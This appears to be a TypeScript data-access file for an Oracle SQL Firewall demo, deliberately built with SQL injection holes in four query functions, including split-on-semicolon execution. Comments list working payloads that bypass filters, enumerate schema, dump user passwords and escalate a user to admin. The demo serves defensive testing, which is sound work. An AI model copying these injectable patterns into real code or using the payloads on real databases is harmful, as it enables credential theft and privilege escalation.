// ============================================================
// ⚠  INTENTIONALLY VULNERABLE — DEMO USE ONLY
// These functions deliberately use raw string concatenation
// instead of oracledb bind variables. This makes them 100%
// injectable so Oracle SQL Firewall can intercept and log the
// anomalous SQL as violations in DBA_SQL_FIREWALL_VIOLATIONS.
// DO NOT use this pattern in any production code.
// ============================================================

import { withConnection } from "./pool";

export async function searchLuxuryItems(q: string): Promise<unknown[]> {
  return withConnection(async (conn) => {
    // VULNERABLE: raw concat — Attack Point 1 ladder:
    //   Step 1: ' OR '1'='1  → all market instruments (boolean bypass)
    //   Step 2: ' UNION SELECT ROWNUM, table_name, 0, 'SCHEMA' FROM user_tables --
    //   Step 3: ' AND 1=0 UNION SELECT ROWNUM, column_name || ' · ' || data_type, 0, 'COLUMNS'
    //            FROM user_tab_columns WHERE table_name = 'USERS' --
    const sql = `SELECT id, name, price, category
                 FROM luxury_items
                 WHERE (name || ' ' || category) LIKE '%${q}%'`;
    const result = await conn.execute<Record<string, unknown>>(sql);
    return result.rows ?? [];
  });
}

export async function filterTransactions(ref: string): Promise<unknown[]> {
  return withConnection(async (conn) => {
    // VULNERABLE: raw concat — payloads:
    //   x' OR user_id<>1 --  → other clients (needs user_id 3,4,5,8,9 rows in DB)
    //   ' OR 1=1 --         → all rows for demo_user + others
    const sql = `SELECT id, user_id, type, amount, asset, timestamp
                 FROM transactions
                 WHERE user_id = 1 AND type = '${ref}'`;
    const result = await conn.execute<Record<string, unknown>>(sql);
    return result.rows ?? [];
  });
}

export async function generateStatement(taxId: string): Promise<unknown[]> {
  return withConnection(async (conn) => {
    // VULNERABLE: raw concat on numeric predicate.
    // Base SELECT uses TO_CHAR so all 4 cols are VARCHAR2 — UNION-compatible
    // with users(id NUMBER, username VARCHAR2, password VARCHAR2, role VARCHAR2).
    // Payload: 0 UNION SELECT TO_CHAR(id), username, password, role FROM users
    const sql = `SELECT TO_CHAR(id)                              AS ref,
                        type                                      AS description,
                        TO_CHAR(amount)                           AS amount,
                        TO_CHAR(timestamp, 'YYYY-MM-DD HH24:MI') AS issued
                 FROM transactions
                 WHERE user_id = ${taxId}`;
    const result = await conn.execute<Record<string, unknown>>(sql);
    return result.rows ?? [];
  });
}

export interface BulkResult {
  stmtsExecuted: number;
  committed: boolean;
}

function splitStatements(sql: string): string[] {
  // Split on ';' to enable the stacked-query demo. Each fragment is executed
  // individually so the Firewall sees each statement separately.
  return sql
    .split(";")
    .map((s) => s.trim())
    .filter((s) => s.length > 0 && !/^--/.test(s));
}

/** Maps legacy presenter payload (ok'; …) to a leading stacked statement. */
function normalizeBulkNote(note: string): string {
  return note.replace(/^ok';\s*/i, "; ");
}

export async function executeBulkAction(note: string): Promise<BulkResult> {
  return withConnection(async (conn) => {
    // VULNERABLE: raw concat + split-execute enables stacked queries.
    // Benign: "Q2 rebalance" → single INSERT with trailing line comment.
    // Attack: ; UPDATE users SET role='admin' WHERE id=1 --
    //   (legacy ok'; prefix is normalized to ';' before split)
    const insert =
      "INSERT INTO transactions (user_id, type, amount) VALUES (1, 'BULK', 0)";
    const normalized = normalizeBulkNote(note);
    const stmts = normalized.includes(";")
      ? splitStatements(`${insert}; ${normalized}`)
      : [`${insert} -- memo: ${note}`];

    for (const stmt of stmts) {
      await conn.execute(stmt);
    }
    await conn.commit();
    return { stmtsExecuted: stmts.length, committed: true };
  });
}
